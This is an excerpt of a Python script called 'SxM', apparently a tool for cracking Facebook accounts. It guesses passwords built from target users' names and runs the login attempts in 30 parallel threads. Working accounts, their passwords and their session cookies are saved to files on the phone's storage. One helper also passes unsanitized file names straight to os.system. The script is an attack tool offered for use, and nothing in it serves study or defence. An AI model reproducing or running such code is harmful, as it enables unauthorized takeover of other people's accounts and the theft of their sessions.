...
from concurrent.futures import ThreadPoolExecutor as SxMSxM
from string import * 
...
model2 = requests.get('https://github.com/sazzad5002/SxM/blob/main/SxM.text').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
...
sys.stdout.write('\x1b]2; SxM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;31m .d8888b.           888b     d888 
\033[1;33md88P  Y88b          8888b   d8888 
\033[1;34mY88b.               88888b.d88888 
\033[1;31m "Y888b.   888  888 888Y88888P888 
\033[1;37m    "Y88b. `Y8bd8P' 888 Y888P 888 
\033[1;31m      "888   X88K   888  Y8P  888 
\033[1;33mY88b  d88P .d8""8b. 888   "   888 
\033[1;34m "Y8888P"  888  888 888       888 
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SxM Menu ")
        exit()
...
def SxM():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/J5eSzwWcAee31gio3k51Wo')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/groups/463607967795665/?ref=share')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SxM(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SxM] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SxMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SxMb};{ckkk}"
                    print(f"\r{R} [SxM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SxM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SxM_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SxM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SxM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SxM] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SxM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SxM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SxM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SxM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SxM] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SxM] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SxM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SxM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with SxMSxM(max_workers=30) as SxMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SxMworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SxMworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SxMworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SxMworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SxM.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SxM.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SxM = input('Put File Name :')
    print(" ")
    SxM = input('Saving Put File Name :')
    os.system('touch ' +SxM)
    os.system('sort -r '+SxM+' | uniq > '+SxM)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SxM )
    print(47*'-')
    print("File Saved To :" + SxM )
    print(47*'-')
    input(f"{S} Press Enter To Back SxM Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SxM.txt\n') 
        filepath = input("Put File Name: ")
